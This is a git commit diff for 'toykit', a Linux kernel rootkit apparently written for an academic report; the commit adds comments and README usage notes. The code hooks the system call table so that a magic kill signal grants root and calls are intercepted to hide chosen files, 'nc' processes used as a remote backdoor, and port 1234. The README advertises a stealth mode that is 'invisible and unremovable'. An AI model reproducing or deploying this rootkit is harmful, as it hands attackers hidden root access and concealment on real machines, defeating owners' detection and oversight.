3f35be1a1e8c0373f6ca40a5fe0f6309acc3f928
Josh Imhoff <joshimhoff13@gmail.com>
2013-05-09 20:10:48 -0400

    Clean up and documentation

--- README.md
+++ README.md
@@ -1,3 +1,14 @@
-#Toykit -- a toy Linux rootkit
+#TOYKIT -- a toy Linux rootkit
+Use at your own risk, dangerous code.
 
-Work in progress. Use at your own risk, dangerous code.
+##USAGE
+###DYNAMIC COMMANDS (after module load time)
+kill -31 12345 gives root access
+kill -16 [some inode] hides a file with inode some inode
+
+###STATIC COMMANDS (before module load time)
+process hiding -- HIDE PROC will not be visible to user
+port hiding -- HIDE PORT will not be visible to user
+
+###STEALTH MODE 
+rootkit is invisible and unremovable
--- toykit.c
+++ toykit.c
@@ -11,32 +11,54 @@
 #include <linux/string.h>
 #include <linux/fdtable.h>
 
-// for local backdoor
-#define LOCAL_PID 12345
-#define LOCAL_SIG 31
+// USAGE
+// DYNAMIC COMMANDS (AFTER MODULE LOAD TIME)
+// kill -31 12345 gives root access
+// kill -16 [some_inode] hides a file with inode some_inode
+
+// STATIC COMMANDS (BEFORE MODULE LOAD TIME)
+// process hiding -- HIDE_PROC will not be visible to user
+// port hiding -- HIDE_PORT will not be visible to user
+
+// STEALTH MODE 
+// rootkit is invisible and unremovable
+// EGASU
+
+// for root-access backdoor
+// kill -31 12345 gives root access
+#define ROOT_PID 12345
+#define ROOT_SIG 31
 
 // for controlling the file hider
+// kill -16 [some_inode] hides a file with inode some_inode
 #define HIDE_SIG 16
 
 // for process hiding
-#define HIDE_PROC "nc" // for remote backdoor
+// nc is hidden for remote backdoor
+#define HIDE_PROC "nc"
 
 // for port hiding
 #define HIDE_PORT "04D2" // 1234 in hex
 
 // for writing to sys_call_table
+// CITATION [6] from report
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
 #define GPF_ENABLE write_cr0(read_cr0() | 0x10000)
 
-unsigned long *sys_call_table = (unsigned long*) 0xc15b0000;  // hard coded, grep /boot/System.map
+// hard coded, grep /boot/System.map
+// sys_call_table is no longer an exported symbol
+unsigned long *sys_call_table = (unsigned long*) 0xc15b0000;
 
-// for hijacking sys_kill
-typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig); // for casting to avoid warnings
+// hijacking sys_kill -- 1. root-access backdoor, 2. hide inodes
+// CITATION [4] from report
+typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
 kill_ptr orig_kill;
 
-static LIST_HEAD(hidden_files); // list of inodes to hide
+// list of inodes to hide
+static LIST_HEAD(hidden_files); 
 
-struct hidden_file { // struct for list of inodes
+// struct for list of inodes
+struct hidden_file { 
 	unsigned long long inode;
 	struct list_head list;
 };
@@ -46,8 +68,9 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	int actual_result;
 	struct hidden_file *toAdd;
 
-	// kill backdoor
-	if (pid == LOCAL_PID && sig == LOCAL_SIG) {
+	// root-access backdoor
+	// CITATION [6] from report
+	if (pid == ROOT_PID && sig == ROOT_SIG) {
 		struct cred *cred;
 		cred = (struct cred *) __task_cred(current);
 		cred->uid = 0;
@@ -60,7 +83,8 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 		cred->fsgid = 0;
 		return 0;
 	}
-	// file hiding, pid = inode of file to be hidden
+	// file hiding
+	// pid = inode of file to be hidden
 	else if (sig == HIDE_SIG) { 
 		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
 		toAdd->inode = (unsigned long long) pid;
@@ -73,15 +97,7 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	return actual_result;
 }
 
-// for checking a process name against HIDE_PROC
-int checkProcName(long pid)
-{
-	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
-		return 1;
-	return 0;
-}
-
-// for hijacking sys_getdents
+// for hijacking sys_getdents -- 1. file hiding, 2. process hiding
 struct linux_dirent {
 	unsigned long d_ino;
 	unsigned long d_off;
@@ -91,6 +107,14 @@ struct linux_dirent {
 	char d_type;
 };
 
+// for proc hiding, checking a process name against the HIDE_PROC constant
+int checkProcName(long pid)
+{
+	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
+		return 1;
+	return 0;
+}
+
 typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp,
                                        unsigned int count);
 getdents_ptr orig_getdents;
@@ -98,7 +122,7 @@ getdents_ptr orig_getdents;
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
                                unsigned int count)
 {
-	int result, bp;
+	int result, bp; // bp = position in bytes in kdirp
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent *d;
@@ -107,7 +131,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	struct fdtable *files_table;
 	struct path file_path;
 	char pbuf[256], *pathname = NULL;
-	long pid = 0; // uninited
+	long pid = 0;
 
 	// run real getdents 
 	result = (*orig_getdents)(fd,dirp,count);
@@ -115,6 +139,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 		return result;
 
 	// get pathname
+	// CITATION [8] from report
 	current_files = current->files;
 	files_table = files_fdtable(current_files);
 
@@ -123,30 +148,30 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
-		return -1;
+		return EFAULT;
 	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
-		return -1;
+		return EINVAL;
 	if (copy_from_user(kdirp,dirp,result))
-		return -1;
+		return EFAULT;
 
-	// check dirp for "files" to hide
+	// check dirp for files to hide
 	for (bp = 0; bp < result; bp += d->d_reclen) {
 		d = (struct linux_dirent *) (kdirp + bp);
 		// process hiding
-		if (!strcmp(pathname,"/proc")) {
+		if (!strcmp(pathname,"/proc")) { // if in /proc
 			kstrtol(d->d_name,10,&pid);
-			if ((pid > 0) && checkProcName(pid)) {
-				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+			if ((pid > 0) && checkProcName(pid)) { // if proc virtual file
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
 				bp -= d->d_reclen;
 			}
 		}
 		// file hiding
-		else {
+		else { // check inodes against list of inodes to hide
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if (d->d_ino == ptr->inode) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
 						result - bp - d->d_reclen);
 					result -= d->d_reclen;
 					bp -= d->d_reclen;
@@ -157,9 +182,9 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 
 	// copy from kernel to userspace
 	if (!access_ok(VERIFY_WRITE,dirp,result))
-		return -1;
+		return EFAULT;
 	if (copy_to_user(dirp,kdirp,result))
-		return -1;
+		return EFAULT;
 	kfree(kdirp);
 
 	// return number of bytes read
@@ -173,7 +198,7 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int result, bp;
+	int result, bp; // bp = position in bytes in kdirp
 	struct hidden_file *ptr;
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent64 *d;
@@ -182,14 +207,15 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	struct fdtable *files_table;
 	struct path file_path;
 	char pbuf[256], *pathname = NULL;
-	long pid = 0; // uninited
+	long pid = 0;
 
-	// run real getdents64 
+	// run real getdents 
 	result = (*orig_getdents64)(fd,dirp,count);
 	if (result <= 0)
 		return result;
 
 	// get pathname
+	// CITATION [8] from report
 	current_files = current->files;
 	files_table = files_fdtable(current_files);
 
@@ -198,30 +224,30 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
-		return -1;
+		return EFAULT;
 	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
-		return -1;
+		return EINVAL;
 	if (copy_from_user(kdirp,dirp,result))
-		return -1;
+		return EFAULT;
 
-	// check dirp for "files" to hide
+	// check dirp for files to hide
 	for (bp = 0; bp < result; bp += d->d_reclen) {
 		d = (struct linux_dirent64 *) (kdirp + bp);
 		// process hiding
-		if (!strcmp(pathname,"/proc")) {
+		if (!strcmp(pathname,"/proc")) { // if in /proc
 			kstrtol(d->d_name,10,&pid);
-			if ((pid > 0) && checkProcName(pid)) {
-				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+			if ((pid > 0) && checkProcName(pid)) { // if proc virtual file
+				memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
 				bp -= d->d_reclen;
 			}
 		}
 		// file hiding
-		else {
+		else { // check inodes against list of inodes to hide
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if (d->d_ino == ptr->inode) {
-					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen, // del dirent
 						result - bp - d->d_reclen);
 					result -= d->d_reclen;
 					bp -= d->d_reclen;
@@ -232,19 +258,21 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	// copy from kernel to userspace
 	if (!access_ok(VERIFY_WRITE,dirp,result))
-		return -1;
+		return EFAULT;
 	if (copy_to_user(dirp,kdirp,result))
-		return -1;
+		return EFAULT;
 	kfree(kdirp);
 
 	// return number of bytes read
 	return result;
 }
 
+// for hijacking sys_read -- 1. port hiding
 typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
                                     size_t count);
 read_ptr orig_read;
 
+// CITATION [7] from report
 asmlinkage long hacked_read(unsigned int fd, char __user *buf,
                             size_t count)
 {
@@ -261,6 +289,7 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 		return result;
 
 	// get pathname
+	// CITATION [8] from report
 	current_files = current->files;
 	files_table = files_fdtable(current_files);
 
@@ -278,15 +307,15 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 			return -1;
 
 		// filter out hidden ports
-		start_line = strchr(kbuf,':') - 4;
+		start_line = strchr(kbuf,':') - 4; // skip first line
 		diff_in_bytes = (start_line - kbuf) * sizeof(char);
 		for (bp = diff_in_bytes; bp < result; bp += diff_in_bytes) {
 			start_line = kbuf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
 			end_line = strchr(start_line,'\n');
 			diff_in_bytes = ((end_line - start_line) + 1) * sizeof(char);
-			if (!strncmp(port_num,HIDE_PORT,4)) {
-				memmove(start_line,end_line + 1,
+			if (!strncmp(port_num,HIDE_PORT,4)) { // if magic port
+				memmove(start_line,end_line + 1, // delete line in file
 					result - bp - diff_in_bytes);
 				result -= diff_in_bytes;
 			}
@@ -294,9 +323,9 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 
 		// copy from kernel to userspace
 		if (!access_ok(VERIFY_WRITE,buf,result))
-			return -1;
+			return EINVAL;
 		if (copy_to_user(buf,kbuf,result))
-			return -1;
+			return EINVAL;
 		kfree(kbuf);
 	}
 
@@ -306,8 +335,8 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 }
 
 int rootkit_init(void) {
-	GPF_DISABLE;
-	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
+	GPF_DISABLE; // make the sys_call_table_readable
+	orig_kill = (kill_ptr)sys_call_table[__NR_kill]; // hooking
 	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
 
 	orig_getdents = (getdents_ptr)sys_call_table[__NR_getdents];
@@ -327,13 +356,14 @@ int rootkit_init(void) {
 void rootkit_exit(void) {
 	struct hidden_file *ptr, *next;
 
-	GPF_DISABLE;
+	GPF_DISABLE; // make the sys_call_table_readable
 	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	sys_call_table[__NR_read] = (unsigned long) orig_read;
 	GPF_ENABLE;
 
+	// delete list of inodes
 	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
 		list_del(&ptr->list);
 		kfree(ptr);
